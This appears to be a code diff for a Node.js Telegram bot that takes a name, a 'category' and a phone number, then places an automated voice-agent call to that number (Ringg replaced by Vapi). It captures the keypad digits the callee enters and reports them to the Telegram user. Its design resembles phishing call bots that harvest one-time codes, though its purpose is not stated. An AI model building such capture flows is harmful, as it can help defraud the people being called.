@@ -2,57 +2,40 @@ const TelegramBot = require("node-telegram-bot-api");
 const mongoose = require("mongoose");
 const axios = require("axios");
 
-// ================= VERCEL CONFIG =================
 exports.config = {
-  api: {
-    bodyParser: true,
-  },
+  api: { bodyParser: true },
 };
 
-// ================= ENV SAFETY =================
-if (!process.env.MONGO_URI) {
-  throw new Error("MONGO_URI is not defined");
-}
-if (!process.env.BOT_TOKEN) {
-  throw new Error("BOT_TOKEN is not defined");
-}
-if (!process.env.RINGG_API_KEY) {
-  throw new Error("RINGG_API_KEY is not defined");
-}
+// ===== ENV CHECK =====
+if (!process.env.MONGO_URI) throw new Error("MONGO_URI missing");
+if (!process.env.BOT_TOKEN) throw new Error("BOT_TOKEN missing");
+if (!process.env.VAPI_API_KEY) throw new Error("VAPI_API_KEY missing");
+if (!process.env.VAPI_ASSISTANT_ID) throw new Error("VAPI_ASSISTANT_ID missing");
+if (!process.env.VAPI_PHONE_ID) throw new Error("VAPI_PHONE_ID missing");
 
-// ================= DB CACHE =================
+// ===== DB CONNECTION =====
 let cached = global.mongo;
-
-if (!cached) {
-  cached = global.mongo = { conn: null, promise: null };
-}
+if (!cached) cached = global.mongo = { conn: null, promise: null };
 
 async function connectDB() {
   if (cached.conn) return cached.conn;
-
   if (!cached.promise) {
-    cached.promise = mongoose.connect(process.env.MONGO_URI, {
-      bufferCommands: false,
-    });
+    cached.promise = mongoose.connect(process.env.MONGO_URI);
   }
-
   cached.conn = await cached.promise;
   return cached.conn;
 }
 
-// ================= BOT SINGLETON =================
+// ===== TELEGRAM BOT =====
 let bot;
-
 function getBot() {
   if (!bot) {
-    bot = new TelegramBot(process.env.BOT_TOKEN, {
-      polling: false,
-    });
+    bot = new TelegramBot(process.env.BOT_TOKEN, { polling: false });
   }
   return bot;
 }
 
-// ================= USER MODEL =================
+// ===== USER MODEL =====
 const User =
   mongoose.models.User ||
   mongoose.model("User", {
@@ -64,211 +47,108 @@ const User =
     otp: String,
   });
 
-// ================= CALL FUNCTION =================
+// ===== VAPI CALL FUNCTION =====
 async function callUser(user) {
-  try {
-    await axios.post(
-      "https://prod-api.ringg.ai/ca/api/v0/calling/outbound/individual",
-      {
-        name: user.titleName,
-        mobile_number: user.phone,
-        agent_id: "69c16290-66af-426c-832f-3681e482a88b", // your real agent_id
-        from_number: "+61363165719", // your Twilio number from dashboard
-      },
-      {
-        headers: {
-          "X-API-KEY": process.env.RINGG_API_KEY,
-          "Content-Type": "application/json",
-        },
-      }
-    );
+  const otp = Math.floor(100000 + Math.random() * 900000).toString();
+  user.otp = otp;
+  user.status = "calling";
+  await user.save();
 
-    console.log("Calling:", user.phone);
-  } catch (err) {
-    console.error(
-      "Ringg Call Error:",
-      err.response?.data || err.message
-    );
-  }
+  console.log("OTP Generated:", otp);
+
+  await axios.post(
+    "https://api.vapi.ai/call",
+    {
+      assistantId: process.env.VAPI_ASSISTANT_ID,
+      phoneNumberId: process.env.VAPI_PHONE_ID,
+      customer: { number: user.phone },
+      metadata: {
+        titleName: user.titleName,
+        category: user.category,
+      },
+    },
+    {
+      headers: {
+        Authorization: `Bearer ${process.env.VAPI_API_KEY}`,
+        "Content-Type": "application/json",
+      },
+    }
+  );
 }
 
-// ================= MAIN HANDLER =================
+// ===== MAIN HANDLER =====
 module.exports = async function handler(req, res) {
-  try {
-    if (req.method !== "POST") {
-      return res.status(200).send("OK");
-    }
+  await connectDB();
+  const bot = getBot();
+  const body = req.body;
 
-    await connectDB();
-    const bot = getBot();
-    const body = req.body;
+  // ===== TELEGRAM =====
+  if (body?.message) {
+    const chatId = body.message.chat.id;
+    const text = body.message.text?.trim();
+    if (!text) return res.status(200).send("OK");
 
-    // ================= TELEGRAM UPDATE =================
-    if (body?.message) {
-      const chatId = body.message.chat.id;
-      const text = body.message.text?.trim();
+    if (text === "/start") {
+      await User.deleteOne({ chatId });
+      await new User({ chatId, status: "name" }).save();
 
-      if (!text) return res.status(200).send("OK");
-
-      // ===== START =====
-      if (text === "/start") {
-        await User.deleteOne({ chatId });
-
-        const user = new User({
-          chatId,
-          status: "name",
-        });
-
-        await user.save();
-
-        await bot.sendMessage(
-          chatId,
+      await bot.sendMessage(chatId,
 `Welcome 👋
-
-Please enter your title + name.
-
+Enter your title + name.
 Example:
-Mr Krishna
-Mrs Karisma`
-        );
-
-        return res.status(200).send("OK");
-      }
-
-      const user = await User.findOne({ chatId });
-      if (!user) return res.status(200).send("OK");
-
-      // ===== NAME =====
-      if (user.status === "name") {
-        if (!text.match(/^(Mr|Mrs|Ms)\s/i)) {
-          await bot.sendMessage(
-            chatId,
-            "❌ Please start with Mr / Mrs / Ms\nExample: Mr Krishna"
-          );
-          return res.status(200).send("OK");
-        }
-
-        user.titleName = text;
-        user.status = "category";
-        await user.save();
-
-        await bot.sendMessage(
-          chatId,
-`Nice to meet you ${user.titleName} 😊
-
-Enter your category:`
-        );
-
-        return res.status(200).send("OK");
-      }
-
-      // ===== CATEGORY =====
-      if (user.status === "category") {
-        user.category = text;
-        user.status = "phone";
-        await user.save();
-
-        await bot.sendMessage(
-          chatId,
-`Send your phone number
-(+CountryCodeNumber)`
-        );
-
-        return res.status(200).send("OK");
-      }
-
-      // ===== PHONE =====
-      if (user.status === "phone") {
-        if (!text.startsWith("+")) {
-          await bot.sendMessage(
-            chatId,
-            "❌ Use international format\nExample: +614xxxxxxxx"
-          );
-          return res.status(200).send("OK");
-        }
-
-        user.phone = text;
-        user.status = "calling";
-        await user.save();
-
-        await bot.sendMessage(chatId, "📞 Calling now...");
-        await callUser(user);
-
-        return res.status(200).send("OK");
-      }
-
-      // ===== OTP TELEGRAM =====
-      if (user.status === "otp") {
-        if (text === user.otp) {
-          user.status = "verified";
-          await user.save();
-
-          await bot.sendMessage(
-            chatId,
-`✅ Verified!
-
-Thank you ${user.titleName}.
-Your request will be processed soon.
-Have a nice day 🌟`
-          );
-        } else {
-          await bot.sendMessage(chatId, "❌ Wrong OTP");
-        }
-
-        return res.status(200).send("OK");
-      }
-
+Mr Krishna`
+      );
       return res.status(200).send("OK");
     }
 
-    // ================= RINGG WEBHOOK =================
-     if (body) {
-     console.log("Ringg Webhook Payload:", body);
-      const { phone, step, intent, digits, status } = body;
+    const user = await User.findOne({ chatId });
+    if (!user) return res.status(200).send("OK");
 
-      const user = await User.findOne({ phone });
-      if (!user) return res.status(200).send("OK");
-
-      if (status === "ringing") {
-        await bot.sendMessage(user.chatId, "📞 Ringing...");
-      }
-
-      if (status === "picked") {
-        await bot.sendMessage(user.chatId, "☎️ Call answered");
-      }
-
-      if (status === "ended") {
-        await bot.sendMessage(user.chatId, "📴 Call ended");
-      }
-
-      if (step === "confirm_request" && intent === "no") {
-        const otp = Math.floor(100000 + Math.random() * 900000).toString();
-
-        user.otp = otp;
-        user.status = "otp";
-        await user.save();
-
-        await bot.sendMessage(
-          user.chatId,
-`🔐 Verification Code: ${otp}
-
-Enter it here in Telegram.`
-        );
-      }
-
-      if (step === "otp_step" && digits) {
-        await bot.sendMessage(
-          user.chatId,
-          `📲 OTP entered on call: ${digits}`
-        );
-      }
-
+    if (user.status === "name") {
+      user.titleName = text;
+      user.status = "category";
+      await user.save();
+      await bot.sendMessage(chatId, "Enter your category:");
       return res.status(200).send("OK");
     }
 
-    return res.status(200).send("OK");
-  } catch (err) {
-    console.error("Webhook Error:", err);
-    return res.status(500).json({ error: err.message });
+    if (user.status === "category") {
+      user.category = text;
+      user.status = "phone";
+      await user.save();
+      await bot.sendMessage(chatId, "Enter phone number (+countrycode):");
+      return res.status(200).send("OK");
+    }
+
+    if (user.status === "phone") {
+      user.phone = text;
+      await user.save();
+      await bot.sendMessage(chatId, "📞 Calling now...");
+      await callUser(user);
+      return res.status(200).send("OK");
+    }
   }
+
+  // ===== VAPI WEBHOOK (DTMF) =====
+  if (body?.dtmf) {
+    const phone = body.customer?.number;
+    const digits = body.dtmf;
+
+    const user = await User.findOne({ phone });
+    if (!user) return res.status(200).send("OK");
+
+    if (digits === user.otp) {
+      user.status = "verified";
+      await user.save();
+
+      await bot.sendMessage(user.chatId,
+`✅ OTP Verified
+Request cancelled successfully.`
+      );
+    } else {
+      await bot.sendMessage(user.chatId, "❌ Wrong OTP entered.");
+    }
+  }
+
+  return res.status(200).send("OK");
 };
